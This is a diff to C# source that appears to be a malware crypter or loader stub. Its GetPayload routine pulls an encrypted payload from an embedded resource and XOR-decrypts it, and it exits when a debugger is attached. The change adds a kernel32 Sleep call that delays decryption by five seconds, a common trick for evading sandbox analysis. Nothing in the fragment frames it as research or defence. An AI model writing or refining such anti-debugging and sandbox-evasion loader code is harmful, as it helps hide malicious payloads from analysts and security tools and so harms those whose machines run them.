@@ -16,13 +16,16 @@ namespace A
         [DllImport("kernel32.dll")]
         private static extern bool IsDebuggerPresent();
 
+        [DllImport("kernel32.dll")]
+        private extern static void Sleep(uint msec);
+
         public static byte[] GetPayload()
         {
             byte[] k = null;
             byte[] p = null;
 
             if (Debugger.IsAttached)
-                return null;          
+                return null;
 
             using (Stream stream = stubAssembly.GetManifestResourceStream(PayloadKey))
             {
@@ -42,6 +45,8 @@ namespace A
                 Random R = new Random();
                 R.NextBytes(k);
             }
+
+            Sleep(1000 * 5);
 
             xor(p, k);
 
